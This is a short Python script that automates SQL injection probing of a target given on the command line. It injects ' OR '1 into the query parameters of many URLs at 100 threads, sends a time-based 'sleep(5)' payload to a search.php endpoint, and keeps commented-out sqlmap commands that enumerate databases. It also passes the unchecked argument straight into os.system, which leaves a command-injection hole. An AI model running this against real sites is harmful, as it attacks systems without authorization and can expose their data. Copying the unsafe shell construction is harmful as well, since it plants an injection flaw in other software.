from os import system
import sys

msg = sys.argv[1]

# system(f"cat {msg}urls.txt | httpx | gf sqli >> sqli ; sqlmap -m sqli --batch --random-agent --level 1")
# system(f"rm -rf sqli")
system(f"cat {msg}urls.txt | httpx | grep '=' | qsreplace \"' OR '1\" | httpx -silent -store-response-dir output -threads 100 | grep -q -rn \"syntax\|mysql\" output 2>/dev/null && printf \"TARGET \033[0;32mCould Be Exploitable\e[m\n\" || printf \"TARGET \033[0;31mNot Vulnerable\e[m\n\" | tee -a {msg}sqli.txt")
# system(f"cat {msg}urls.txt | httpx | rush -j20 'if curl -Is \"{msg}\" | head -1 | grep -q \"HTTP\"; then echo \"Running Sqlmap on '{msg}'\"; sqlmap -u \"{msg}\" --batch --random-agent --dbs; fi' | tee -a {msg}sqli.txt")
system(f"time curl -s 'https://{msg}/search.php?q=1 AND sleep(5)--' | tee -a {msg}sqli.txt")

print(f"SQLi vulnerabilities saved to: {msg}sqli.txt")

# system(f"cat tee -a {msg}sqli.txt | notify")
